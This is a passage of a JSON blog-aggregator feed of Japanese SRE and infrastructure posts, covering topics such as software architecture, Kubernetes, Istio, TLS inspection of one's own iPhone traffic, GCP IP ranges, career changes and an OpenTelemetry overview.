ソフトウェアアーキテクチャの第一法則「どうやって」よりも「なぜ」の方がずっと重要だ。ソフトウェアアーキテクチャの第二法則ソフトウェアアーキテクチャのすべてはトレードオフがあるが、どちらを優先しても10年後の結果は誰にも分からなかった。だから、まぁ「なぜ」が重要なんだろうな。悔いが残らない方をチームや組織で選ばなきゃいけないんだろうな。しかし、数ある選択肢の中でなぜその選択がなされたのか他の技術ではだめなのか？ を説明するのは難しい。だから、アーキテクトには技術の深さより幅が求められるんだろうな。基礎の概念は開発に関わる全ての人間は知っておいて良いアーキテクチャにおける重要なトレードオフを理解するには、開発者はコンポーネント、モジュール性、結合、そしてコナーセンスに関する基本的な概念と用語を理解しなければならないが自分がここで説明してもめちゃくちゃ薄く複数の解釈ができるようになってしまうので読んでないのに堂々と語るというには言及が難しく。著者が大事にしている軸になる考え方です。ここについて堂々と語るにはやっぱりちゃんと理解する必要がある。ソフトウェアアーキテクトへの期待されるソフトスキルソフトウェアアーキテクトへの8つの期待でも「対人スキルを持っている」と「政治を理解し、かじ取りする」などがあるがそれ以外にも『ソフトウェアアーキテクチャの基礎』では図解やプレゼンテーションの大切さ、過不足なくチームを管理する方法、開発チーム、ビジネスチームに対してどう向き合うか？ キャリアの形成についての言及もある。読みものに近い気もするがヒントがあるかもしれないです。まとめ『ソフトウェアアーキテクチャの基礎』はシステム設計に関わったことがある人ならばあの時、本書を読んでいればあの時の設計の判断はなにかが変わったかもしれないと思えるほど学びのある一冊でした。読まずに堂々と語るにはやっぱり惜しい書籍です。アーキテクチャには絶対的で正解な選択肢がなくそれぞれにトレードオフがあり地上最強の〇〇は限定的です。脳死で要はバランスとしか言う人にもなりたくない。トレードオフを一定の水準や基準で見極めることができる能力のあるエンジニアになりたいです。カンファレンスや技術ブログ記事で紹介されているツールやシステム構造にすぐに飛びつきたくなる私のような無知で軽率な若者にはとても響きました。SREはプログラマーとしてではなくアーキテクチャ特性の専門家としてアーキテクチャに対する意見を求めれます。アーキテクチャ全体についての知識は得ておくと良いのではないか？ と思いますみなさんも『ソフトウェアアーキテクチャの基礎』及び『ソフトウェアアーキテクチャ・ハードパーツ』をぜひ手に取ってみてください。","link":"https://syu-m-5151.hatenablog.com/entry/2022/10/27/170608","isoDate":"2022-10-27T08:06:08.000Z","dateMiliSeconds":1666857968000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Google Cloud Binary Authorization 徹底調査","contentSnippet":"Binary Authorization とは 概要 コンテナベースのアプリケーションに ソフトウェアサプライチェーンのセキュリティを提供する Google Cloud のサービスです。 補足 ソフトウェアサプライチェー […]The post Google Cloud Binary Authorization 徹底調査 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/google-cloud-binary-authorization/","isoDate":"2022-10-27T00:46:10.000Z","dateMiliSeconds":1666831570000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Gitlab Ci で Kaniko build し Trivy で scan する","contentSnippet":"GitLab CI でコンテナイメージを Docker daemon の不要な Kaniko で build し、それを Trivy でスキャンする方法 まず、kaniko で --tarPath を指定して tar ファイルで書き出す 書き出す先を artifacts で指定したディレクトリ","link":"https://blog.1q77.com/2022/10/gitlab-ci-kaniko-and-trivy/","isoDate":"2022-10-26T14:34:28.000Z","dateMiliSeconds":1666794868000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"PodSecurityPolicy について考えてみた","contentSnippet":"話すこと 案件で Kubernetes のセキュリティについて調べることがあったので、各レイヤで何が必要かを検討しました。 Node レイヤ・Inspector・(falco) Pod レイヤ・(falco)・セキュリテ […]The post PodSecurityPolicy について考えてみた first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/pod-security-policy/","isoDate":"2022-10-24T02:15:18.000Z","dateMiliSeconds":1666577718000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Anthos Service Mesh の Outbound Access Log を出力する","contentSnippet":"Anthos Service Mesh のアクセスログはデフォルトでは Service への Inbound しか出力されません。 エラーが発生した場合は Outbound のログも出力されます。 出力先は Cloud Logging で HTTP の情報は Load Balancer などと同様に httpRequest という Object","link":"https://blog.1q77.com/2022/10/asm-access-log/","isoDate":"2022-10-21T15:33:40.000Z","dateMiliSeconds":1666366420000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"10年ぶりに転職しました","contentSnippet":"先日まで面白法人カヤックに勤めていました。転職の経緯も書こうと思ったのですが、内面の変化や会社との関係性など多岐に渡りけっこうなボリュームになりそうだったので分けることにしました。転職のためにやったこと久しく転職活動をしておらず、ポートフォリオや職務経歴書というものがなくどこから手を付けたらいいのやらという状態で、つまりは自分の整理ができていないところからのスタートでした。また、Wantedlyの内容を充実させたことにより少しずつスカウトをいただく機会が増えました。転職活動を振り返って転職活動を始めるまでは沈んでいたこともあり、スカウトをいただいただけでも大変ありがたかったです。ありがたいことに合計17ほどスカウトをいただきました。多いのか少ないのかはわかりませんが、こんな自分にも興味を持ってくださって素直にうれしかったです。PCのキッティングやアカウント管理など日常業務をやる担当はいるコーポレート部門の社員が情シスを兼任(情シスは未経験)情シス部門を立ち上げたいカジュアル面談といいつつ、半分は相談のような面談もあり情シスで悩みを抱えている会社がたくさんあるという現状を知るきっかけにもなりました。それは、「情シス担当者を育てられる環境をつくること」です。そして、自身のチャレンジしてみたいこととニーズがマッチした会社と出会いました。転職先とこれからやっていきたいことその出会った会社というのはスリーシェイクです。SreakeやSecurify,Reckonerといったサービスの運用のお困りごとを手助けできるサービスを展開しています。スリーシェイクは現状100人に満たない規模で情シスには若手が1人います。PCキッティングやアカウント管理など日常業務で手一杯情報システム部として見たときにできていないところを強化していきたいそれをやるのに何をやっていけばいいかわからないという感じでした。最後にこれをお読みいただいた方の中には前職から筆者を知っていただいている方もいるかもしれません。あいも変わらずやっておりますので、何かあれば(もしくは何もなくても)遊びに伺います。お気軽にお声がけください。","link":"https://blog.jigyakkuma.org/2022/10/20/recruit2022/","isoDate":"2022-10-20T00:37:52.000Z","dateMiliSeconds":1666226272000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"Kubernetes で StatefulSet の Volume を resize する","contentSnippet":"Kubernetes で StatefulSet に volumeClaimTemplates を指定して Persistent Volume を使用している環境で volume のサイズを変更する方法。 素直に StatefulSet の manifest を変更して apply しようとすると次のように StatefulSet で更新可能なのは replicas, template, updateStragety だけだよとエラーに","link":"https://blog.1q77.com/2022/10/kubernetes-resize-statefulset-volume/","isoDate":"2022-10-18T13:36:49.000Z","dateMiliSeconds":1666100209000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"”thisisunsafe” 魔法の言葉 - ChromeでNET::ERR_CERT_INVALIDが出た時の対応","contentSnippet":"TipsMAC でkubectl port-forward を用いてlocalhost に対してHTTPSアクセスをしたら、Chromeで「この接続ではプライバシーが保護されません　NET::ERR_CERT_INVALID」と表示されてしまうことがある。「詳細設定」を押してもいっても解決策が出てこない。そういう時には半角英数モードでthisisunsafeとキーボード入力しすればアクセスできるようになる。しかも、一定期間すぎたらこのようなメッセージが出てきます。stackoverflow.com","link":"https://syu-m-5151.hatenablog.com/entry/2022/10/18/161000","isoDate":"2022-10-18T07:10:00.000Z","dateMiliSeconds":1666077000000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"DNS over HTTPS 通信の中身を確認する","contentSnippet":"iPhone の HTTP(S) 通信を OWASP ZAP で覗いてみたたら 8.8.8.8, 8.8.4.4 に対して DNS over HTTPS の通信を見つけたのでどんなやり取りをしているのか確認してみた。 DNS over HTTPS でのリクエスト> DNS over HTTPS でのリクエスト # リク","link":"https://blog.1q77.com/2022/10/iphone-dns-over-https/","isoDate":"2022-10-15T15:11:55.000Z","dateMiliSeconds":1665846715000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"apt-key is deprecated への対応","contentSnippet":"Debian 系の Linux で古いインストール手順なんかを見てコマンドをコピペしていると出くわすこのメッセージ Warning: apt-key is deprecated. Manage keyring files in trusted.gpg.d instead (see apt-key(8)). package 署名の公開鍵の管理方法が変わったみたいです リ","link":"https://blog.1q77.com/2022/10/apt-key-is-deprecated/","isoDate":"2022-10-15T13:06:00.000Z","dateMiliSeconds":1665839160000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"iPhone の通信を覗く","contentSnippet":"先日 iPhone のアプリが https で通信している内容を覗いてみようと HTTP プロキシに OWSAP ZAP を指定して覗いてみました。 OWASP ZAP が動的に証明書を発行してくれるので、その発行元となる CA を iPhone に登","link":"https://blog.1q77.com/2022/10/iphone-packet-capture/","isoDate":"2022-10-14T13:10:09.000Z","dateMiliSeconds":1665753009000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"CDK for Terraform を理解する","contentSnippet":"はじめに 基本的な使い方をまとめてみました。 CDK for Terraform Is Now Generally Available 今回は TypeScript を使っている前提で記述するため、他の言語を利用する場合 […]The post CDK for Terraform を理解する first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/cdk-for-terraform/","isoDate":"2022-10-06T02:27:54.000Z","dateMiliSeconds":1665023274000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Istio のサービスへの接続でプロトコルエラーになる","contentSnippet":"現象Istio サービスメッシュを有効にした Kubernetes クラスタ内に立てた Service に接続しようとするも，upstream connect error or disconnect/reset before headers. reset reason: protocol error が出て到達できない。例えば，以下のような Service に gRPC で接続しようとしても失敗する。apiVersion: v1kind: Servicemetadata:  name: my-servicespec:  selector:    app.kubern...","link":"https://zenn.dev/toshikish/articles/d0dd54ae067bed","isoDate":"2022-10-04T02:55:06.000Z","dateMiliSeconds":1664852106000,"authorName":"toshikish","authorId":"toshikish"},{"title":"CPU Resource limit に思いを馳せてみた","contentSnippet":"本日お伝えしたいこと あらゆるものが抽象化・仮想化されても、CPU やメモリの仕組みやプロトコルの性質などの計算機における基礎知識は持っておかないと調査がうまくいかない場面がある、ということです。具体的なエピソードを交え […]The post CPU Resource limit に思いを馳せてみた first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/cpu-resource-limit/","isoDate":"2022-09-27T08:03:06.000Z","dateMiliSeconds":1664265786000,"authorName":"Sreake","authorId":"Sreake"},{"title":"トイルを撲滅するための3つのステップ","contentSnippet":"トイルを削減できなければ、前向きな作業にかけられる時間が減るだけでなく、作業員の士気の減退やスキルアップの機会の減少などのデメリットがあります。The post トイルを撲滅するための3つのステップ first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/toil-eradication-3step/","isoDate":"2022-09-14T09:34:07.000Z","dateMiliSeconds":1663148047000,"authorName":"Sreake","authorId":"Sreake"},{"title":"TiDB 入門 (tiup playground)","contentSnippet":"MySQL 互換の NewDB として最近気になっている TiDB について調査すべく、クラスタを手元で簡単にセットアップ可能な tiup playgroud コマンドを使って触ってみます。気にな…","link":"https://qiita.com/yteraoka/items/4471e548fb556ef740f4","isoDate":"2022-09-06T08:13:57.000Z","dateMiliSeconds":1662452037000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"リモートワークと子育てで役に立ったグッズたち","contentSnippet":"地方でのリモートワークと第一子の子育てをはじめて1年以上が経った。子を抱っこしながら仕事をしたり、家族と過ごす中で「これがあったから乗り越えられた」グッズを紹介する。バランスボールギムニク フィットボール 65cm パールホワイトギムニク(GYMNIC)Amazonリモートワークは運動不足になりがちで、それを少しでも防ぐためにと買った僕の椅子である。夜泣きと言えば無限スクワットや無限ゆらゆらであるが、抱っこしたままボールに乗ってボヨンボヨンするとあっという間に寝てくれる。ヒップシートLUCKY 1934 POLBAN ADVANCE(ポルバンアドバンス) ヒップシート セカンド抱っこ紐 メッシュ ウエストポーチタイプ P7310 (リップストップオールブラック)LUCKY 1934Amazon赤ちゃんの抱っこといえば抱っこひもやおんぶひもが定番だと思う。通常の抱っこひもは肩に荷重が集中してしまうため長時間つけているのがキツい。ヒップシートはウエストポーチのような形状で、かなり太い腰ベルトを支点にして赤ちゃんのおしりを下から支える仕組みになっている。赤ちゃんを支えるのが肩から腰付近になることでかなり負担が軽減した。POLBAN (ポルバン) ヒップシートダブルショルダー(単品) 抱っこひも 抱っこ紐 オールメッシュブラック P730210Buddy BuddyAmazonオプションの両肩かけベルトを取りつけると普通の抱っこひものように肩にかけて使うこともできるので成長や状況に合わせて変形することができる。赤ちゃんのおしりを支えたうえで肩ベルトをかけるので肩への負担はすごく少ない。FlexiSpotFLEXISPOT スタンディングデスク 電動式昇降デスク 高さ調節 5年保証 人間工学 パソコンデスク ブラック ゲーミングデスク E7BFLEXISPOTAmazonリモートワークということで仕事デスクは電動で昇降できるモデルを使用している。抱っこしながら仕事をするためにはデスクの高さが重要で、腰痛の原因になってしまう。モニターアームエルゴトロン LX デスクマウント モニターアーム マットブラック 34インチ(3.2~11.3kg)まで対応 45-241-224エルゴトロンAmazon抱っこしながらデスクに向かうと、子の頭が邪魔になってうまく画面が見えないことがある。モニターアームを使ってモニタを吊るすと自由に角度や位置を調整できるので快適に仕事に向かうことができる。Nature RemoNature スマートリモコン Nature Remo 3 ネイチャーリモ Remo-1W3 Alexa/Google Home/Siri対応Nature RemoAmazonお昼寝や寝かしつけた後でも、寝室が快適な温度であるか、エアコンの設定がどうなっているかが気になる。我が家はリビング、寝室、仕事部屋の3箇所にNature Remoを設置しており温度、湿度、照度が監視できたり各部屋のエアコンなどが遠隔操作できる。スマートホームとの連携により声で操作ができたり、寝かしつけの15分前から寝室のエアコンをつけておくなど時限式の設定もできるので手放せない。まとめまだまだ子育ては大変なので便利なグッズとともに乗り越えていくぞ!","link":"https://pranc1ngpegasus.hatenablog.com/entry/2022/09/05/120000?utm_source=feed","isoDate":"2022-09-05T03:00:00.000Z","dateMiliSeconds":1662346800000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"負荷テストツール K6 について調べてみた","contentSnippet":"はじめに K6 を初めて触ってから 7-8ヶ月くらいたったので、K6 のツール周りに関する情報紹介で社内で発信した情報をまとめてみました。 k6 jslib まず、K6 には k6 jslib という K6 の拡張ツール […]The post 負荷テストツール K6 について調べてみた first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/learn-about-k6/","isoDate":"2022-09-01T02:10:07.000Z","dateMiliSeconds":1661998207000,"authorName":"Sreake","authorId":"Sreake"},{"title":"オレの書くGoは間違っていた","contentSnippet":"!この記事で取り扱っているGoのお作法について解釈が間違っていると指摘をいただきました。詳細はこちらをご覧ください。Go言語には\\"Accept interfaces, return structs\\"というお作法がある。このお作法の存在に気づいていなかったし、そうでなくても正しく動いてくれていた。Goを3年ほど書いてきてようやくお作法を理解したので紹介したい。https://bryanftan.medium.com/accept-interfaces-return-structs-in-go-d4cab29a301b これまでのぼくの書き方以下にこれまでぼくが書いていた...","link":"https://zenn.dev/pranc1ngpegasus/articles/a8c92235bec641","isoDate":"2022-08-30T11:34:54.000Z","dateMiliSeconds":1661859294000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"Google Cloud が公開しているIP rangeから特定のRegionのIP rangeを抜き出す","contentSnippet":"やったことGoogle Cloud はhttps://www.gstatic.com/ipranges/cloud.json というサイトでGoogle Cloud で利用しているIP rangeが公開されている。余談ではありますがAWSは同様に https://ip-ranges.amazonaws.com/ip-ranges.json に公開されている。みんなが大好きなjqコマンドのselectでscopeの値がasia-northeast1 なものだけを抜き出しています。また、サービスによって自分の利用しているリージョン以外へのアクセスが必要なものもあると思うのでアクセスリストを作る際には気をつけてほしいです。curl -s https://www.gstatic.com/ipranges/cloud.json | jq -r \'.prefixes[] | select(.scope == \\"asia-northeast1\\") | .ipv4Prefix\' | grep -v null結果(asia-northeast1)で利用されているIPアドレス34.84.0.0/1634.85.0.0/1734.104.62.0/2334.104.128.0/1734.127.190.0/2334.146.0.0/1634.157.64.0/2034.157.164.0/2234.157.192.0/2035.187.192.0/1935.189.128.0/1935.190.224.0/2035.194.96.0/1935.200.0.0/1735.213.0.0/1735.220.56.0/2235.221.64.0/1835.230.240.0/2035.242.56.0/2235.243.64.0/18104.198.80.0/20104.198.112.0/20参考GCPのIPアドレス範囲をリスト化AWSとかGCPが公式に公開されているIP rangeを取得するツールを書いた - 地方エンジニアの学習日記","link":"https://syu-m-5151.hatenablog.com/entry/2022/08/24/115833","isoDate":"2022-08-24T02:58:33.000Z","dateMiliSeconds":1661309913000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"疲弊しないSREチームを作るために必要な6つのポイント","contentSnippet":"本記事では、疲弊しないSREチームを作るために必要な6つのポイントを紹介します。SREチームをどのように形成すればよいか悩んでいる企業様は参考にしてください。The post 疲弊しないSREチームを作るために必要な6つのポイント first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/not-exhaustion-engineer/","isoDate":"2022-08-23T03:36:21.000Z","dateMiliSeconds":1661225781000,"authorName":"Sreake","authorId":"Sreake"},{"title":"リリースエンジニアリングについて理解する [デプロイ戦略]","contentSnippet":"サービスのリリースにかかるダウンタイムを減らし、安定稼働する戦略を取ることはユーザーからの満足度及び信頼度向上につながります。本記事では、SREの取り組みのひとつであるリリースエンジニアリング、そしてデプロイ戦略について解説していきます。The post リリースエンジニアリングについて理解する [デプロイ戦略] first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/release-engineer/","isoDate":"2022-08-23T03:00:00.000Z","dateMiliSeconds":1661223600000,"authorName":"Sreake","authorId":"Sreake"},{"title":"アンチパターンからSREを理解する","contentSnippet":"日本国内でも、サービスの信頼性向上のためにSREに取り組む企業も増えてきました。しかし誤ったやり方で実施したがゆえに、思ったように成果が出ないと嘆く企業もあるのではないでしょうか。 そこで今回はSREのアンチパターンをも […]The post アンチパターンからSREを理解する first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/anti-pattern-sre/","isoDate":"2022-08-17T08:47:45.000Z","dateMiliSeconds":1660726065000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Terraform state の構成の提案","contentSnippet":"動機 単一の Terraform state でリソースを構築していると、徐々にリソース数が増加し、コードの見通しが悪くなったり plan 時間が長くなったりといった問題が発生します。 単一 state で運用していたが […]The post Terraform state の構成の提案 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/terraform-state-structure/","isoDate":"2022-08-15T23:16:16.000Z","dateMiliSeconds":1660605376000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Graceful Node Shutdown で Terminated 状態で残る Pod を削除する cronjob","contentSnippet":"GKE (GKE 限定な話ではないけれども) で Preemptible な node を使用していると Graceful Node Shutdown により停止させられた Pod が Failed 状態でどんどん溜まっていって結構邪魔です。 できれば消えて欲しい。 ということ","link":"https://blog.1q77.com/2022/08/delete-failed-pod-periodically/","isoDate":"2022-08-12T12:19:57.000Z","dateMiliSeconds":1660306797000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"envoy-sidecar-helper で Job の終了後に istio-proxy を停止させる","contentSnippet":"Istio を導入した環境で Job (CronJob) を実行すると、sidecar としての istio-proxy コンテナを Job 本来の処理が終わった後に istio-proxy コンテナを終了させないといつまで経っても Pod が終了しないという課","link":"https://blog.1q77.com/2022/08/stop-istio-proxy-using-envoy-sidecar-helper/","isoDate":"2022-08-12T11:51:14.000Z","dateMiliSeconds":1660305074000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"GKE Service の NEG を Terraform で作成する","contentSnippet":"GKE の Ingress で Load Balancer を作成すると、同一 namespace 内の Service にしか振り分けられないとか、単一の Cluster でしか使えないとか不都合な場合があります。その場合 Load Balancer 関連のリソースは Terraform で作成したくな","link":"https://blog.1q77.com/2022/08/create-gke-service-neg-using-terraform/","isoDate":"2022-08-09T11:13:48.000Z","dateMiliSeconds":1660043628000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"スリーシェイクにジョインしました","contentSnippet":"転職エントリです。7月からスリーシェイクにバックエンドエンジニアとして入社しました。入社のきっかけpranc1ngpegasus.hatenablog.com育児休暇に入ってすぐにエージェント経由でお誘いをいただいて、カジュアル面談からスタートしました。ちょうど次に手を伸ばしたい領域としてインフラに興味があったし、名前を知っていた会社だったのでかなり乗り気でした。育児休暇中というのもあり仕事に対する考え方を見直すいい機会になったので、ついでに他にも数社のカジュアル面談を受けてみました。その中でやりたいことをやれそうな企業だったのでジョインすることに決めました。なんで転職しようと思ったのかpranc1ngpegasus.hatenablog.com先の記事にいろいろ辞めたくなる動機となり得るものを書いたのだけど、本当の動機は「季節がきたなぁ」と感じたから。マンネリ化してきたというか、全く新しいところに飛び込みたくなったというか、とにかくいまと全然違うところに行きたくなっただけでした。なにをやっていきたいのか好きな言語のひとつであるGoをメインに、インフラ領域を勉強していきたいと考えています。GCPメインの会社なのでGCPとか、TerraformとかのIaCまわりに興味があるので業務をしながら学んでいきたいです。","link":"https://pranc1ngpegasus.hatenablog.com/entry/2022/07/27/212153?utm_source=feed","isoDate":"2022-07-27T12:21:53.000Z","dateMiliSeconds":1658924513000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"ブログを久しぶりにリニューアル","contentSnippet":"どうも、ご無沙汰しておりました。Hugo Themeの変更ブログのホスティングをGAEからCloudflare Pagesに移行記事の管理をbitbucketからGitHubに移行Google Analyticsの対応記事内の手入れHugo Themeの変更どこから手を付けようかなと整理したところ、今まで使っていたThemeがmarkdown記法に対応していなかったというのもあって見た目のところから変えることにした。hugo-theme-stackこのThemeは見た目がすっきりでコンテンツが並べやすそうだったので選びました。今回はフロント自体はさっくり終わらせたかったのでなるたけシンプルなものにしています。ホスティングをGAEからCloudflare Pagesに移行GAEにした経緯はこちらに書いてあるのですが、もともとGCSでホスティングしていたのをhttps化できればよかったんですが、ロードバランサーを置くとお金がかかりそうだなということでGAEに移行していました。AWS AmplifyCloudflare PagesGitHub PagesちなみにこれらはJAMstackホスティングに類するサービスです。各サービスは無料枠、もしくはローコストで運用できるという魅力もあるためどれもよさそうでしたが今まで使ったことがないという理由でCloudflareを使ってみることにしました。Cloudflare Pagesではリポジトリとブランチを指定するだけですぐにエンドポイントを払い出してくれるので5分とかからずに初期設定が完了できました。また、Cloudflare Pagesは静的ジェネレーターを使用する前提になっているので、Build configrationsで普段使っているFrameworkを選択してあげるだけでOKです。リポジトリをBitbucketからGitHubに移行ブログ記事の管理は長らくBitbucketを利用していたのですが、ブログを書き始めた当時は無償でプライベートリポジトリを使えるのがBitbucketしかなかったからでした。いい感じにcloneしていい感じにpushするとできそうだなというのはわかっていたので以下を参考にしつつ移行しました。How to migrate from Bitbucket to GitHubGoogle Analyticsの対応ここまできてようやくリニューアルの当初の本題なんですが、hugo-theme-stackはGA4に対応しているようなのでconfigにGA4の測定IDをセッティングすればそれだけでOKでした。googleanalytics = your measurementID記事内の手入れ最後が何気に大変だったのですが、書き溜めていた記事の記法が統一されていなかったり目立つところがいくつかあったのでついでにやってしまいました。lists記法の統一画像がlocalだったりGoogle Driveにホスティングしてたりしたのをlocalに統一shortcodeを整えるあとはフォントがデフォルトだと日本語ではないのでReferenceを見ながらlayoutを追加。Custom font family for article content最初はGA4対応どうするかな〜から始まったブログリニューアルでしたが、こまめに手入れしていればこんな大掛かりにならずに済みましたね…ブログの運用自体がsandboxというところもあるので、これを機に年単位でガッとやらずに小さい単位でやっていきたい所存です。","link":"https://blog.jigyakkuma.org/2022/07/14/blog-renewal2022/","isoDate":"2022-07-14T12:53:20.000Z","dateMiliSeconds":1657803200000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"2022年版 OpenTelemetryを知れば世界が平和に","contentSnippet":"はじめにOpenTelemetryとはOpentelemetry のコンポーネントOpentelemetry のプロジェクトの仕様とStatusTracingMetricsLogging(Specification にドキュメントがない)BaggageOpenTelemetry のSpanとTraceOpenTelemetry CollectorとはCollector のメリットOpenTelemetry Collector Architecture とはOpenTelemetry とSDKとパッケージOpenTelemetry と自動計装今後のOpentelemetry について次回予告:OpenTelemetry とOpenTelemetry Collectorを使ったTracingとMetricsをアプリケーションで利用する方法参照リンクはじめに最初は、SRE に成る君に最低限の開発力を身に着けてほしい の解像度の上げる方法の為のGo言語みたいなこと書こうしました。しかし、内容をまとめる能力が乏しく、断念しました。書いている途中で、参考資料として改訂2版 みんなのGo言語 や実用 Go言語、Cloud Native Go を読んでいたら、この内容を齟齬なく伝える自信が完全になくなったので読んでもらえばいいやと自暴自棄になりました。今回は、OpenTelemetry の実装や仕組みに対する言及などが社内でないような気がしました。この共有会ではOpenTelemetry の話を何となく聞かれた時に答えられるようにしていただければと思います。OpenTelemetryプロジェクトを実際に使わなくてもプロジェクトの状況や概念、項目(ログの設計など)を知ることで現在の監視設計や運用、判断に活かせる場面が出てくるかもしれません。現状のOpenTelemetry はログ、メトリクス、トレースの全てカバーできるツールというわけではないですが1年後にはその全てをサポートしてそうな勢いと計画があります。OpenTelemetryとはhttps://opentelemetry.io/docs/concepts/what-is-opentelemetry/OpenTelemetry は、オブザーバビリティの三本柱のログ、メトリクス、トレースの計装と収集を標準化しようとする野心的なプロジェクトです。ベンダーに依存しない実装を提供し、選択したバックエンドにテレメトリーデータを送信する方法を標準化することを目的としています。OpenTracingとOpenCensusの後継的なプロジェクトで新たな標準化ツールとなります。また、仕様が全体的に固まってきたので今後、テレメトリデータを扱うツールとして広まっていくのではないかと思います。 こちらはOpenTelemetryのこれまでとこれから の資料を参考にさせていただきました。\uD83D\uDCA1 Telemetry とは遠隔測定法（えんかくそくていほう）は、観測対象から離れた地点から様々な観測を行い、そのデータを取得する技術です。観測地点に常駐することが物理的・経済的あるいは安全上困難な場合や、観測対象が移動する場合に使用されます。テレメトリー(telemetry) あるいはテレメタリング(telemetering) ということもあります。 装置そのものは、テレメータ (telemeter) と呼ばれています。https://ja.wikipedia.org/wiki/遠隔測定法Opentelemetry のコンポーネントhttps://opentelemetry.io/docs/concepts/components/OpenTelemetryは現在、いくつかの主要コンポーネントで構成されています。仕様すべての実装に対する言語に限らない横断的な要件と実装に必要な事項を記述する。CollectorOpenTelemetry Collectorは、テレメトリデータを受信、処理、およびエクスポートできるベンダーに依存しないプロキシです。複数の形式（OTLP、Jaeger、Prometheus、および多くの商用/独自のツールなど）でのテレメトリデータの受信と、1つ以上のバックエンドへのデータの送信をサポートします。自動計装OpenTelemetry は、サポートされる言語用の一般的なライブラリやフレームワークから関連するテレメトリデータを生成する幅広い数のコンポーネントをサポートします。例えば、HTTP ライブラリからのインバウンドとアウトバウンドの HTTP リクエストは、それらのリクエストに関するデータを生成します。自動計測の使用方法は言語によって異なり、アプリケーションと一緒にロードするコンポーネントの使用を好むか要求するかもしれませんし、コードベースで明示的にパッケージを取り込むのが良いかもしれません。言語ごとのSDKOpenTelemetryには言語SDKもあります。OpenTelemetry APIを使用して、選択した言語でテレメトリデータを生成し、そのデータを優先バックエンドにエクスポートすることもできます。これらのSDKを使用すると、アプリケーションの手動インストルメンテーションに接続するために使用できる一般的なライブラリおよびフレームワークの自動インストルメンテーションを組み込むこともできます。ベンダーは、バックエンドへのエクスポートを簡単にするために、言語SDKの配布を行うことがよくあります。Opentelemetry のプロジェクトの仕様とStatushttps://opentelemetry.io/status/現在、皆さんが関わっている各案件でOpenTelemetry の利用が可能かどうかについて聞かれると思います。何となく聞かれた時に答えられるようにこれ、各シグナルごとにこれぐらいは進んでいるんだと理解していただければと思います。OpenTelemetryは、シグナルごとに開発されています。シグナルとはトレース、メトリクス、バッゲージ、ロギングなどの仕様でサポートされているテレメトリのカテゴリを指しています。シグナルは、分散システム間でデータを相関させるための共有メカニズムのcontext propagation(コンテキストの伝播)の上に構築されています。これらは主に4つで構成されています。Tracinghttps://opentelemetry.io/docs/concepts/signals/traces/API: stable, feature-freezeSDK: stableProtocol: stableNotes:トレース仕様は現在完全に安定しており、長期的なサポートでカバーされています。トレース仕様はまだ拡張可能ですが、後方互換性のある方法でのみ行われます。OpenTelemetryクライアントは、そのトレース実装が完了した時点で、v1.0にバージョンアップされます。Metricshttps://opentelemetry.io/docs/concepts/signals/metrics/API: stableSDK: mixedProtocol: stableNotes:OpenTelemetry Metricsは現在活発に開発中です。データモデルは安定しており、OTLPプロトコルの一部としてリリースされています。メトリックパイプラインの実験的なサポートはCollectorで利用可能です。PrometheusのCollectorサポートは、Prometheusコミュニティと協力して、現在開発中です。Logging(Specification にドキュメントがない)https://opentelemetry.io/docs/concepts/signals/logs/API: draftSDK: draftProtocol: stableNotes:OpenTelemetry Logging は現在、活発に開発が進められています。ログデータモデルはOpenTelemetryプロトコルの一部としてリリースされています。OpenTelemetry プロジェクトへの Stanza の寄贈により、多くのデータフォーマットに対するログ処理が Collector に追加されています。現在、多くの言語でのログアペンダが開発中です。ログ・アペンダーは、トレースやスパンIDなどのOpenTelemetryトレース・データを既存のロギング・システムに付加することができます。OpenTelemetry ロギングSDKも現在開発中です。これにより、OpenTelemetryクライアントが既存のロギングシステムからロギングデータを取り込み、トレースやメトリクスとともにOTLPの一部としてログを出力することができます。OpenTelemetryのロギングAPIは、現在開発中ではありません。まず、既存のロギングシステムとの統合に重点を置いています。メトリクスが完成したら、OpenTelemetryのロギングAPIの開発に焦点を移します。Baggagehttps://opentelemetry.io/docs/concepts/signals/baggage/API: stable, feature-freezeSDK: stableProtocol: N/ANotes:OpenTelemetry Baggage は現在完全に安定しています。Baggage は観測可能なツールではなく、トランザクションに任意のキーと値を付加し、下流のサービスがそれらにアクセスできるようにするためのシステムです。そのため、BaggageにはOTLPやCollectorのコンポーネントはありません。OpenTelemetry のSpanとTracehttps://opentelemetry.io/docs/concepts/observability-primer/OpenTelemetryにおけるトレース情報はSpanとTraceという概念で定義されています。Span: リクエスト内の各処理の情報（e.g. 処理名、実行時間、ステータスコードなどなど）Trace: 